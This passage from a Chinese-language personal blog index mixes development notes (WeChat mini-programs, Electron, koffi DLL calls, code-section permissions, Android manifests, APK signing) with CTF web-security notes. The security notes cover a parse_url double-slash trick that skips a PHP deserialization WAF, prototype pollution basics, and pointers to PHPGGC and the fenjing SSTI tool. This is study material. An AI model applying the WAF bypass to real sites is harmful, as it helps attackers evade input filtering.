      <categories>
        <category>Web</category>
        <category>php</category>
      </categories>
  </entry>
  <entry>
    <title>parse_url绕过</title>
    <url>/2024/05/01/Web/php/parse_url%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p><a class="link"   href="https://www.cnblogs.com/Lee-404/p/12826352.html" >parse_url绕过 - Lee-404 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="双斜杠绕过"><a href="#双斜杠绕过" class="headerlink" title="双斜杠绕过"></a>双斜杠绕过</h2><p>逻辑类似下面的</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$url</span>[<span class="string">&#x27;query&#x27;</span>],<span class="variable">$query</span>);</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$query</span> <span class="keyword">as</span> <span class="variable">$value</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^O/i&quot;</span>,<span class="variable">$value</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;STOP HACKING&#x27;</span>);</span><br><span class="line">                    <span class="keyword">exit</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>可通过给上上级路由添加两个<code>/</code></p>
<p>如<code>127.0.0.1:8000///web/index.php?aaa=bbb</code></p>
<p>原理</p>
<blockquote>
<p>$_SERVER[‘REQUEST_URI’]为你输入的url值也就是当前链接<code>127.0.0.1:8000///web/index.php?aaa=bbb</code></p>
<p><code>//</code>会引起parse_url报错返回false而false就无法执行<code>parse_str($url[&#39;query&#39;],$query)</code>自然就进不了waf逻辑</p>
</blockquote>
]]></content>
      <categories>
        <category>Web</category>
        <category>php</category>
      </categories>
  </entry>
  <entry>
    <title>php</title>
    <url>/2023/04/17/Web/php/php/</url>
    <content><![CDATA[<p>php中变量以$变量名来命令变量</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure></div>

<p>利用变量来调用函数</p>
<p>[<a class="link"   href="https://www.nssctf.cn/problem/2604" >HUBUCTF 2022 新生赛]HowToGetShell | NSSCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在 PHP 中，<code>$</code> 符号通常用于表示变量名称。PHP 中的变量名必须由 <code>$</code> 符号开头，其后是一个合法的变量名字符串。</p>
<p>例如，以下代码声明了一个名为 <code>$name</code> 的变量，并将其赋值为字符串 “John”：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">php复制代码$name = &quot;John&quot;;</span><br></pre></td></tr></table></figure></div>

<p><code>$</code> 符号在其他编程语言中也有类似的作用，如在 Shell 中 <code>$</code> 用于替换环境变量，而在 JavaScript 中 <code>$</code> 符号则没有特殊的含义。</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>php</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2024/05/01/Web/php/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p><a class="link"   href="https://github.com/ambionics/phpggc" >ambionics&#x2F;phpggc: PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>[<a class="link"   href="https://icode.best/i/98379040861373" >安洵杯 2019]iamthinking-爱代码爱编程 (icode.best) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/xrzxyyds/p/the-introduction-and-installation-of-the-use-of-phpggc-s81yc.html" >PHPGGC的使用介绍和安装 - xrzx - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Web</category>
        <category>php</category>
      </categories>
  </entry>
  <entry>
    <title>qianduan</title>
    <url>/2023/03/02/Web/%E5%89%8D%E7%AB%AF/qianduan/</url>
    <content><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="WXML"><a href="#WXML" class="headerlink" title="WXML"></a>WXML</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://www.runoob.com/images/box-model.gif"
                      alt="CSS box-model"
                ></p>
<p>微信版的html，有些许修改，但基本上只是参数名上的修改</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--用于显示块类似于&lt;head&gt;,&lt;body&gt;之类的标签--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scroll-view</span> <span class="attr">scroll-y</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--滚动条的效果，x轴滚动可改为&quot;scroll-x&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">swiper</span>&gt;</span><span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--轮播图的父项可以用来装&lt;swiper-item&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span><span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--用于在容器内部显示轮播图，是swiper的子项可以用来装&lt;view&gt;项--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">自定义名称</span> <span class="attr">class</span>=<span class="string">&quot;自定义名称&quot;</span>&gt;</span>&lt;\自定义名称&gt;</span><br><span class="line"><span class="comment">&lt;!--用于自定义元素，可以通过wxss来定义对应class的参数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rich-text</span> <span class="attr">nodes</span>=<span class="string">&quot;html语句&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">rich-text</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--可用于使用服务器所传递的html内容--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;按钮样式&quot;</span> <span class="attr">size</span>=<span class="string">&quot;按钮大小&quot;</span> <span class="attr">plain</span>=<span class="string">&quot;true&quot;</span><span class="attr">镂空</span> <span class="attr">bindtap</span>=<span class="string">&quot;被绑定的函数 类似于c语句goto&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--用于渲染一个按钮--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;图片地址 可以为图床的地址&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;图片比例&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--用于渲染图片--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">bindinput</span>=<span class="string">&quot;方法名&quot;</span>(<span class="attr">调用对应函数</span>) <span class="attr">value</span>=<span class="string">(进行绑定，也可定义显示的初始值)</span>&gt;</span>.&lt;\input&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="swiper参数"><a href="#swiper参数" class="headerlink" title="swiper参数"></a>swiper参数</h3><table>
<thead>
<tr>
<th>indicator-dots</th>
<th>显示轮播图的位置（第几张）</th>
</tr>
</thead>
<tbody><tr>
<td>indicator-color</td>
<td>小圆点的颜色</td>
</tr>
<tr>
<td>indicator-active-color</td>
<td>激活的小圆点颜色</td>
</tr>
<tr>
<td>autoplay</td>
<td>自动轮播</td>
</tr>
<tr>
<td>interval</td>
<td>改变轮播时间 单位ms</td>
</tr>
<tr>
<td>circular</td>
<td>衔接滑动，头尾相连</td>
</tr>
</tbody></table>
<h3 id="事件绑定"><a href="#事件绑定" class="headerlink" title="事件绑定"></a>事件绑定</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\前端\qianduan.assets\image-20230305171346536.png"
                      alt="image-20230305171346536"
                ></p>
<p>可通过bindtap&#x3D;”对应方法名”来传递事件，该事件可用e(event)来表示可通过e.相应参数来获取对应事件的参数如上图</p>
<h4 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h4><p>通过对相应元素增加 data-参数名&#x3D;”参数”进行传递</p>
<p>注意传递的是对应事件，除了通过自身事件的e.target.dataset.”参数名”可通过外部的”e.target.dataset.参数名”来访问具体如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\前端\qianduan.assets\image-20230305203312340.png"
                      alt="image-20230305203312340"
                ></p>
<p>上面的是当前事件(currentTarget)对应的各项参数</p>
<p>下面是追溯到实际事件(target)获得的参数</p>
<p>注意：**<code>Object</code>** 是 JavaScript 的一种 <a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures" >数据类型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。它用于存储各种键值集合和更复杂的实体。Objects 可以通过 <code>Object()</code> 构造函数或者使用 <a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Object_initializer" >对象字面量 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的方式创建,可类似于结构体</p>
<h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><h4 id="wx-if-x3D-”“-当if为非0时才会进行渲染对应的元素块"><a href="#wx-if-x3D-”“-当if为非0时才会进行渲染对应的元素块" class="headerlink" title="wx:if &#x3D;”“,当if为非0时才会进行渲染对应的元素块"></a>wx:if &#x3D;”“,当if为非0时才会进行渲染对应的元素块</h4><p>wx:elif，wx:else与上列并行</p>
<h4 id="hidden-x3D-”“-情况为true"><a href="#hidden-x3D-”“-情况为true" class="headerlink" title="hidden&#x3D;”“,情况为true"></a>hidden&#x3D;”“,情况为true</h4><h4 id="wx-for-x3D-”“-用于循环遍历数组内元素"><a href="#wx-for-x3D-”“-用于循环遍历数组内元素" class="headerlink" title="wx:for&#x3D;”“ 用于循环遍历数组内元素"></a>wx:for&#x3D;”“ 用于循环遍历数组内元素</h4><p>用表示其索引(下标),用表示其元素(在index索引下的元素)，对wx:for-index(或item)可对两者进行改名</p>
<p>也可用wx:key&#x3D;”key的名字”可提高渲染效率，与数字相对应</p>
<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="WXSS"><a href="#WXSS" class="headerlink" title="WXSS"></a>WXSS</h2><p>微信版的css</p>
<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div>



<h1 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h1><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>()<span class="comment">//用于弹出警告</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>()<span class="comment">//用于输出到控制台</span></span><br></pre></td></tr></table></figure></div>

<h4 id="微信小程序"><a href="#微信小程序" class="headerlink" title="微信小程序"></a>微信小程序</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="E:\note\前端\qianduan.assets\image-20230302213110759.png"
                      alt="image-20230302213110759"
                ></p>
<p>data用于存储数据 注意在对其赋值时应当取“:”,用等号时会白屏</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Math.random()可以生成随机数(0~1),可在后面*10生成0到10的随机数,可添加toFixed(位数)限制生成的位数</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">wx.<span class="title function_">request</span>(</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span>:<span class="string">&quot;网址&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">method</span>:<span class="string">&quot;post&quot;</span>或<span class="string">&quot;get&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">data</span>:&#123;&#125;<span class="comment">//shu&#x27;ju</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>Web</category>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>nodejs原型链污染</title>
    <url>/2024/02/26/Web/nodejs/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<p>参考 <a class="link"   href="https://blog.csdn.net/qq_51586883/article/details/119867720" >js原型链污染(超详细)-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>原型链类似于父类</p>
<p>由相同类形成的对象 其共用同一种原型 所以可以通过更改其中一个对象的原型达成修改所有对象的目的</p>
<p>例如</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">in</span>: tmp=&#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line"><span class="attr">out</span>: &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>&#125;</span><br><span class="line"><span class="attr">in</span>: tmp.<span class="property">a</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>==tmp.<span class="property">__proto__</span> <span class="comment">//此处是tmp.a(number)的原型跟tmp(object)原型不对应</span></span><br><span class="line"><span class="attr">out</span>: <span class="literal">false</span></span><br><span class="line"><span class="attr">in</span>: tmp.<span class="property">b</span>=&#123;<span class="string">&#x27;c&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="attr">out</span>: &#123;<span class="string">&#x27;c&#x27;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="attr">in</span>: tmp.<span class="property">b</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>==tmp.<span class="property">__proto__</span> <span class="comment">//此处是tmp.b(object)跟tmp(object)类型一样,所以共用原型</span></span><br><span class="line"><span class="attr">out</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure></div>

<p>node js中万物皆对象</p>
<p>当该对象中没有这个属性时会从其原型寻找，所以可以通过修改其原型来达成修改该对象属性的目的</p>
<p>此处Object指任意对象 class指任意类</p>
<p>可以有下列办法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Object.constructor.prototype</span><br><span class="line">Object.constructor.__proto__</span><br><span class="line">class.prototype</span><br></pre></td></tr></table></figure></div>

<p>待完成</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>nodejs</category>
      </categories>
  </entry>
  <entry>
    <title>fenjing</title>
    <url>/2024/08/02/Web/%E5%B7%A5%E5%85%B7/fenjing/</url>
    <content><![CDATA[<p>搞SSTI非常好</p>
<p><code>pip install fenjing</code></p>
]]></content>
      <categories>
        <category>Web</category>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>模拟发包</title>
    <url>/2024/06/03/Web/%E5%B7%A5%E5%85%B7/%E6%A8%A1%E6%8B%9F%E5%8F%91%E5%8C%85/</url>
    <content><![CDATA[<p>scapy</p>
]]></content>
      <categories>
        <category>Web</category>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>start</title>
    <url>/2024/04/27/%E5%BC%80%E5%8F%91/Electron/start/</url>
    <content><![CDATA[<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">npx create-electron-app <span class="comment">#通过远程下载create-electron-app创建electron项目</span></span><br><span class="line">npx electron . <span class="comment">#远程执行electron编译项目</span></span><br><span class="line">npx electron-packager <span class="comment">#打包</span></span><br><span class="line">npx electron-packager <span class="string">&#x27;项目路径&#x27;</span> <span class="string">&#x27;打包出来的位置&#x27;</span>  --asar <span class="comment">#用asar对源码打包</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>开发</category>
        <category>Electron</category>
      </categories>
  </entry>
  <entry>
    <title>调用动态链接库</title>
    <url>/2024/05/07/%E5%BC%80%E5%8F%91/Electron/%E8%B0%83%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
    <content><![CDATA[<p><a class="link"   href="https://nongchatea.gitbook.io/koffi-chinese" >https://nongchatea.gitbook.io/koffi-chinese <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>example</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> koffi = <span class="built_in">require</span>(<span class="string">&#x27;koffi&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load the shared library</span></span><br><span class="line"><span class="keyword">const</span> lib = koffi.<span class="title function_">load</span>(<span class="string">&#x27;user32.dll&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare constants</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MB_OK</span> = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MB_YESNO</span> = <span class="number">0x4</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MB_ICONQUESTION</span> = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MB_ICONINFORMATION</span> = <span class="number">0x40</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">IDOK</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">IDYES</span> = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">IDNO</span> = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Find functions</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MessageBoxA</span> = lib.<span class="title function_">func</span>(<span class="string">&#x27;__stdcall&#x27;</span>, <span class="string">&#x27;MessageBoxA&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;void *&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;uint&#x27;</span>]);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">MessageBoxW</span> = lib.<span class="title function_">func</span>(<span class="string">&#x27;__stdcall&#x27;</span>, <span class="string">&#x27;MessageBoxW&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, [<span class="string">&#x27;void *&#x27;</span>, <span class="string">&#x27;str16&#x27;</span>, <span class="string">&#x27;str16&#x27;</span>, <span class="string">&#x27;uint&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> ret = <span class="title class_">MessageBoxA</span>(<span class="literal">null</span>, <span class="string">&#x27;Do you want another message box?&#x27;</span>, <span class="string">&#x27;Koffi&#x27;</span>, <span class="variable constant_">MB_YESNO</span> | <span class="variable constant_">MB_ICONQUESTION</span>);</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="variable constant_">IDYES</span>)</span><br><span class="line">    <span class="title class_">MessageBoxW</span>(<span class="literal">null</span>, <span class="string">&#x27;Hello World!&#x27;</span>, <span class="string">&#x27;Koffi&#x27;</span>, <span class="variable constant_">MB_ICONINFORMATION</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="title function_">returnANumber</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> dll.<span class="title function_">returnANumber</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="较方便的调用"><a href="#较方便的调用" class="headerlink" title="较方便的调用"></a>较方便的调用</h2><p>用类似于c函数声明的格式</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> printf = lib.<span class="title function_">func</span>(<span class="string">&#x27;int printf(const char *fmt, ...)&#x27;</span>);</span><br><span class="line"><span class="comment">// The parameter name is not used by Koffi, and optional</span></span><br><span class="line"><span class="keyword">const</span> atoi = lib.<span class="title function_">func</span>(<span class="string">&#x27;int atoi(str)&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>开发</category>
        <category>Electron</category>
      </categories>
  </entry>
  <entry>
    <title>节区</title>
    <url>/2024/08/07/%E5%BC%80%E5%8F%91/C-C++/%E8%8A%82%E5%8C%BA/</url>
    <content><![CDATA[<h2 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h2><blockquote>
<p>通过<code>#pragma code_seg(&quot;.节区名&quot;)</code>定义节区留空则为默认节区</p>
<p>注意其影响范围为下面所有所以需要在切换节区时使用<code>#pragma code_seg()</code>中断这个节区的定义</p>
<p>通过<code>#pragma comment(linker, &quot;/SECTION:.节区名,权限&quot;)</code>定义节区权限</p>
<p>权限有</p>
<blockquote>
<p>E 执行</p>
<p>R 读取</p>
<p>W 写入</p>
</blockquote>
<p>具体操作</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg(<span class="string">&quot;.SMF&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> flag[] = <span class="string">&quot;flag&#123;this_is_test&#125;&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/SECTION:.SMF,ERW&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg()</span></span><br></pre></td></tr></table></figure></div>


</blockquote>
<h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><blockquote>
<p><code>__attribute__((section(&quot;.段名&quot;)))</code>即可，权限需要手动更改ld文件或者手动更改<code>IMAGE_SECTION_HEADER SectionHeaders</code>内的段权限</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">__attribute__((<span class="built_in">section</span>(<span class="string">&quot;.SMC&quot;</span>)))</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</blockquote>
]]></content>
      <categories>
        <category>开发</category>
        <category>C-C++</category>
      </categories>
  </entry>
  <entry>
    <title>android manifest</title>
    <url>/2024/01/24/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/android%20manifest/</url>
    <content><![CDATA[<p>参考<a class="link"   href="https://developer.android.google.cn/guide/topics/manifest/manifest-intro?hl=zh" >应用清单概览  | Android 开发者  | Android Developers (google.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p> example:</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> <span class="comment">&lt;!--用于表示文本编码和版本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.MyApplication&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">tools:targetApi</span>=<span class="string">&quot;31&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
</blockquote>
<h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p><manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"></p>
<p><a class="link"   href="https://developer.android.google.cn/guide/topics/manifest/manifest-element?hl=zh" >&lt;清单&gt;  | Android 开发者  | Android Developers (google.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>AndroidManifest.xml</code> 文件的根元素。它必须包含 <code>&lt;application&gt;</code> 元素并指定 <code>xmlns:android</code> 和 <code>package</code> 属性。</p>
<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2>]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>apk签名</title>
    <url>/2023/11/09/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/apk%E7%AD%BE%E5%90%8D/</url>
    <content><![CDATA[<p>apk签名需要keystore文件 由下列命令生成</p>
<p><code>keytool -genkey -alias &quot;别名&quot; -keyalg RSA -keysize 2048 -validity 36500 -keystore &quot;要生成的文件名&quot;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202311100037717.png"
                      alt="image-20231110003739570"
                ></p>
<p>选择构建apk文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202311100038707.png"
                      alt="image-20231110003851655"
                ></p>
<p>输入你keystore的密码<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202311100046908.png"
                      alt="image-20231110004652859"
                ></p>
<p>直接下一步下一步即可</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>安卓开发</category>
      </categories>
  </entry>
  <entry>
    <title>golangAAR导入</title>
    <url>/2023/11/02/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93%E5%BC%80%E5%8F%91/golangAAR%E5%AF%BC%E5%85%A5/</url>
    <content><![CDATA[<p>安装好gomobile后</p>
<p>如果使用go mod模式就直接在.go文件处<code>go mod init xxx</code>即可</p>
<p><code>gomobile bind -target android (init出来的包名)</code></p>
<p>注意golang的外部可调用方法得开头大写</p>
